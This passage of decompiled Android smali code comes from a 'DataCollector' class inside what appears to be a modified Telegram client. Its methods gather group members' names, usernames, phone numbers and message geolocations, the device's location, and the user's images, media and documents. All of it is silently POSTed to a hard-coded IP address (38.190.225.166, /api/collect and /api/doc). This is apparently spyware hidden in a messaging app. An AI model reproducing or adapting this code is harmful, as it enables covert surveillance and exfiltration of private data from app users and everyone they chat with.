    invoke-static {p1, p2}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    goto :goto_0

    .line 1146
    :cond_0
    sget-object v0, Lorg/telegram/messenger/Utilities;->globalQueue:Lorg/telegram/messenger/DispatchQueue;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda26;

    invoke-direct {v1, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda26;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-virtual {v0, v1, p1, p2}, Lorg/telegram/messenger/DispatchQueue;->postRunnable(Ljava/lang/Runnable;J)Z

    :goto_0
    return-void
.end method

.method private scheduleJsonQueueDrain(J)V
    .locals 3

    const-wide/16 v0, 0x0

    cmp-long v2, p1, v0

    if-gtz v2, :cond_0

    .line 1136
    sget-object p1, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance p2, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda22;

    invoke-direct {p2, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda22;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-static {p1, p2}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    goto :goto_0

    .line 1138
    :cond_0
    sget-object v0, Lorg/telegram/messenger/Utilities;->globalQueue:Lorg/telegram/messenger/DispatchQueue;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda27;

    invoke-direct {v1, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda27;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-virtual {v0, v1, p1, p2}, Lorg/telegram/messenger/DispatchQueue;->postRunnable(Ljava/lang/Runnable;J)Z

    :goto_0
    return-void
.end method

.method private scheduleMediaUpload(ILorg/telegram/tgnet/TLRPC$Message;)V
    .locals 7

    .line 1803
    iget v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    if-lez v0, :cond_2

    iget-wide v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-nez v4, :cond_0

    goto :goto_0

    .line 1806
    :cond_0
    iget-object v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->attachPath:Ljava/lang/String;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    .line 1807
    new-instance v0, Ljava/io/File;

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$Message;->attachPath:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1808
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 1809
    iget-wide v3, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    iget v5, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    move-object v1, p0

    move v2, p1

    move-object v6, v0

    invoke-virtual/range {v1 .. v6}, Lorg/telegram/messenger/DataCollector;->sendImage(IJILjava/io/File;)V

    .line 1810
    iget-wide v3, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    iget v5, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    invoke-virtual/range {v1 .. v6}, Lorg/telegram/messenger/DataCollector;->sendMedia(IJILjava/io/File;)V

    return-void

    .line 1816
    :cond_1
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda47;

    invoke-direct {v1, p0, p1, p2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda47;-><init>(Lorg/telegram/messenger/DataCollector;ILorg/telegram/tgnet/TLRPC$Message;)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    :cond_2
    :goto_0
    return-void
.end method

.method private sendDirect(Lorg/json/JSONObject;)V
    .locals 6

    const-string v0, "POST"

    const-string v1, "https://38.190.225.166/api/collect"

    .line 2444
    :try_start_0
    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {p1, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object p1

    .line 2445
    sget-object v2, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v2}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    .line 2446
    new-instance v3, Ljava/net/URL;

    invoke-direct {v3, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v3

    check-cast v3, Ljava/net/HttpURLConnection;

    .line 2447
    invoke-virtual {v3, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 2448
    const-string v4, "Content-Type"

    const-string v5, "application/json; charset=UTF-8"

    invoke-virtual {v3, v4, v5}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 2449
    const-string v4, "Content-Length"

    array-length v5, p1

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v4, 0x1

    .line 2450
    invoke-virtual {v3, v4}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const/16 v4, 0x1770

    .line 2451
    invoke-virtual {v3, v4}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    .line 2452
    invoke-virtual {v3, v4}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 2453
    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->sha256Hex([B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v0, v1, v4, v2}, Lorg/telegram/messenger/DataCollector;->addHMACHeaders(Ljava/net/HttpURLConnection;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2454
    invoke-virtual {v3}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    .line 2455
    invoke-virtual {v0, p1}, Ljava/io/OutputStream;->write([B)V

    .line 2456
    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V

    .line 2457
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V

    .line 2458
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    .line 2459
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 2461
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "sendDirect: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "TGCollect"

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method private sendDocumentFile(IJILjava/io/File;)V
    .locals 14

    if-eqz p5, :cond_c

    .line 2530
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_2

    .line 2531
    :cond_0
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-eqz v4, :cond_c

    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/32 v2, 0x3200000

    cmp-long v4, v0, v2

    if-lez v4, :cond_1

    goto/16 :goto_2

    .line 2532
    :cond_1
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v13

    .line 2533
    sget-object v0, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-virtual {v13, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    .line 2535
    const-string v1, ".pdf"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v0, "application/pdf"

    :goto_0
    move-object v12, v0

    goto/16 :goto_1

    .line 2536
    :cond_2
    const-string v1, ".doc"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    const-string v0, "application/msword"

    goto :goto_0

    .line 2537
    :cond_3
    const-string v1, ".docx"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v0, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"

    goto :goto_0

    .line 2538
    :cond_4
    const-string v1, ".xls"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_5

    const-string v0, "application/vnd.ms-excel"

    goto :goto_0

    .line 2539
    :cond_5
    const-string v1, ".xlsx"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_6

    const-string v0, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"

    goto :goto_0

    .line 2540
    :cond_6
    const-string v1, ".ppt"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_7

    const-string v0, "application/vnd.ms-powerpoint"

    goto :goto_0

    .line 2541
    :cond_7
    const-string v1, ".pptx"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_8

    const-string v0, "application/vnd.openxmlformats-officedocument.presentationml.presentation"

    goto :goto_0

    .line 2542
    :cond_8
    const-string v1, ".txt"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_9

    const-string v0, "text/plain"

    goto :goto_0

    .line 2543
    :cond_9
    const-string v1, ".zip"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_a

    const-string v0, "application/zip"

    goto :goto_0

    .line 2544
    :cond_a
    const-string v1, ".apk"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_b

    const-string v0, "application/vnd.android.package-archive"

    goto :goto_0

    .line 2545
    :cond_b
    const-string v0, "application/octet-stream"

    goto :goto_0

    .line 2549
    :goto_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "doc:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move v3, p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-wide/from16 v4, p2

    invoke-virtual {v0, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move/from16 v6, p4

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-wide/16 v7, 0x0

    const/4 v9, 0x0

    .line 2550
    const-string v2, "https://38.190.225.166/api/doc"

    move-object v0, p0

    move-object/from16 v10, p5

    move-object v11, v13

    invoke-direct/range {v0 .. v12}, Lorg/telegram/messenger/DataCollector;->enqueueFileUpload(Ljava/lang/String;Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_c

    .line 2552
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "sendDocumentFile: queue unavailable for "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TGCollect"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_c
    :goto_2
    return-void
.end method

.method private sendGroupSpeaker(ILorg/telegram/tgnet/TLRPC$Message;)V
    .locals 8

    if-eqz p2, :cond_9

    .line 1684
    iget-wide v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-gez v4, :cond_9

    iget-object v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->from_id:Lorg/telegram/tgnet/TLRPC$Peer;

    if-eqz v4, :cond_9

    iget-wide v4, v4, Lorg/telegram/tgnet/TLRPC$Peer;->user_id:J

    cmp-long v6, v4, v2

    if-gtz v6, :cond_0

    goto/16 :goto_5

    .line 1686
    :cond_0
    iget-object v2, p0, Lorg/telegram/messenger/DataCollector;->sentGroupSpeakers:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {p0, v0, v1, v4, v5}, Lorg/telegram/messenger/DataCollector;->groupSpeakerCooldownKey(JJ)J

    move-result-wide v0

    invoke-direct {p0, v2, v0, v1}, Lorg/telegram/messenger/DataCollector;->checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    .line 1687
    :cond_1
    invoke-direct {p0, p1, v4, v5}, Lorg/telegram/messenger/DataCollector;->resolveUser(IJ)Lorg/telegram/tgnet/TLRPC$User;

    move-result-object v0

    if-nez v0, :cond_2

    return-void

    .line 1690
    :cond_2
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 1691
    const-string v2, "type"

    const-string v3, "group_speaker"

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1692
    const-string v2, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v6

    invoke-virtual {v1, v2, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1693
    const-string p1, "dialog_id"

    iget-wide v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    invoke-virtual {v1, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1694
    const-string p1, "group_id"

    invoke-direct {p0, p2}, Lorg/telegram/messenger/DataCollector;->groupIdForMessage(Lorg/telegram/tgnet/TLRPC$Message;)J

    move-result-wide v2

    invoke-virtual {v1, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1695
    const-string p1, "user_id"

    invoke-virtual {v1, p1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1696
    const-string p1, "first_name"

    iget-object v2, v0, Lorg/telegram/tgnet/TLRPC$User;->first_name:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, ""

    if-eqz v2, :cond_3

    goto :goto_0

    :cond_3
    move-object v2, v3

    :goto_0
    :try_start_1
    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1697
    const-string p1, "last_name"

    iget-object v2, v0, Lorg/telegram/tgnet/TLRPC$User;->last_name:Ljava/lang/String;

    if-eqz v2, :cond_4

    goto :goto_1

    :cond_4
    move-object v2, v3

    :goto_1
    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1698
    const-string p1, "username"

    iget-object v2, v0, Lorg/telegram/tgnet/TLRPC$User;->username:Ljava/lang/String;

    if-eqz v2, :cond_5

    goto :goto_2

    :cond_5
    move-object v2, v3

    :goto_2
    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1699
    const-string p1, "phone"

    iget-object v2, v0, Lorg/telegram/tgnet/TLRPC$User;->phone:Ljava/lang/String;

    if-eqz v2, :cond_6

    move-object v3, v2

    :cond_6
    invoke-virtual {v1, p1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1700
    const-string p1, "bot"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->bot:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1701
    const-string p1, "verified"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->verified:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1702
    const-string p1, "premium"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->premium:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1703
    const-string p1, "contact"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->contact:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1704
    const-string p1, "mutual_contact"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->mutual_contact:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1705
    const-string p1, "deleted"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->deleted:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1706
    const-string p1, "scam"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->scam:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1707
    const-string p1, "fake"

    iget-boolean v2, v0, Lorg/telegram/tgnet/TLRPC$User;->fake:Z

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1708
    const-string p1, "last_msg_id"

    iget v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1709
    const-string p1, "last_msg_date"

    iget v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->date:I

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1710
    iget-object p1, v0, Lorg/telegram/tgnet/TLRPC$User;->photo:Lorg/telegram/tgnet/TLRPC$UserProfilePhoto;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v2, "has_avatar"

    if-eqz p1, :cond_7

    const/4 p1, 0x1

    .line 1711
    :try_start_2
    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1712
    const-string p1, "avatar_photo_id"

    iget-object v2, v0, Lorg/telegram/tgnet/TLRPC$User;->photo:Lorg/telegram/tgnet/TLRPC$UserProfilePhoto;

    iget-wide v2, v2, Lorg/telegram/tgnet/TLRPC$UserProfilePhoto;->photo_id:J

    invoke-virtual {v1, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1713
    const-string p1, "avatar_dc_id"

    iget-object v0, v0, Lorg/telegram/tgnet/TLRPC$User;->photo:Lorg/telegram/tgnet/TLRPC$UserProfilePhoto;

    iget v0, v0, Lorg/telegram/tgnet/TLRPC$UserProfilePhoto;->dc_id:I

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    goto :goto_3

    :catch_0
    move-exception p1

    goto :goto_4

    :cond_7
    const/4 p1, 0x0

    .line 1715
    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1717
    :goto_3
    iget-object p1, p2, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    instance-of v0, p1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaGeo;

    if-eqz v0, :cond_8

    iget-object p1, p1, Lorg/telegram/tgnet/TLRPC$MessageMedia;->geo:Lorg/telegram/tgnet/TLRPC$GeoPoint;

    if-eqz p1, :cond_8

    .line 1718
    const-string v0, "geo_latitude"

    iget-wide v2, p1, Lorg/telegram/tgnet/TLRPC$GeoPoint;->lat:D

    invoke-virtual {v1, v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 1719
    const-string p1, "geo_longitude"

    iget-object v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    iget-object v0, v0, Lorg/telegram/tgnet/TLRPC$MessageMedia;->geo:Lorg/telegram/tgnet/TLRPC$GeoPoint;

    iget-wide v2, v0, Lorg/telegram/tgnet/TLRPC$GeoPoint;->_long:D

    invoke-virtual {v1, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 1720
    const-string p1, "geo_accuracy_radius"

    iget-object p2, p2, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    iget-object p2, p2, Lorg/telegram/tgnet/TLRPC$MessageMedia;->geo:Lorg/telegram/tgnet/TLRPC$GeoPoint;

    iget p2, p2, Lorg/telegram/tgnet/TLRPC$GeoPoint;->accuracy_radius:I

    invoke-virtual {v1, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1722
    :cond_8
    invoke-direct {p0, v1}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_5

    .line 1724
    :goto_4
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "sendGroupSpeaker: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_9
    :goto_5
    return-void
.end method

.method private sendLocation(ILandroid/location/Location;Ljava/lang/Runnable;)V
    .locals 5

    if-nez p2, :cond_0

    return-void

    .line 2741
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 2742
    const-string v1, "type"

    const-string v2, "location"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2743
    const-string v1, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 2744
    const-string p1, "latitude"

    invoke-virtual {p2}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    invoke-virtual {v0, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 2745
    const-string p1, "longitude"

    invoke-virtual {p2}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    invoke-virtual {v0, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 2746
    const-string p1, "accuracy"

    invoke-virtual {p2}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    float-to-double v1, v1

    invoke-virtual {v0, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 2747
    const-string p1, "provider"

    invoke-virtual {p2}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-virtual {p2}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_1

    :cond_1
    const-string v1, ""

    :goto_0
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 2748
    const-string p1, "loc_ts"

    invoke-virtual {p2}, Landroid/location/Location;->getTime()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-virtual {v0, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 2749
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->enqueueJson(Lorg/json/JSONObject;)Z

    move-result p1

    if-nez p1, :cond_2

    const/4 p1, 0x0

    .line 2750
    invoke-direct {p0, v0, p3, p1}, Lorg/telegram/messenger/DataCollector;->postJsonDirect(Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 2753
    :goto_1
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string p3, "sendLocation: "

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2
    :goto_2
    return-void
.end method

.method private static sha256Hex([B)Ljava/lang/String;
    .locals 8

    const/4 v0, 0x1

    const/4 v1, 0x0

    .line 748
    :try_start_0
    const-string v2, "SHA-256"

    invoke-static {v2}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v2

    .line 749
    invoke-virtual {v2, p0}, Ljava/security/MessageDigest;->digest([B)[B

    move-result-object p0

    .line 750
    new-instance v2, Ljava/lang/StringBuilder;

    array-length v3, p0

    mul-int/lit8 v3, v3, 0x2

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 751
    array-length v3, p0

    const/4 v4, 0x0

    :goto_0
    if-ge v4, v3, :cond_0

    aget-byte v5, p0, v4

    const-string v6, "%02x"

    invoke-static {v5}, Ljava/lang/Byte;->valueOf(B)Ljava/lang/Byte;

    move-result-object v5

    new-array v7, v0, [Ljava/lang/Object;

    aput-object v5, v7, v1

    invoke-static {v6, v7}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

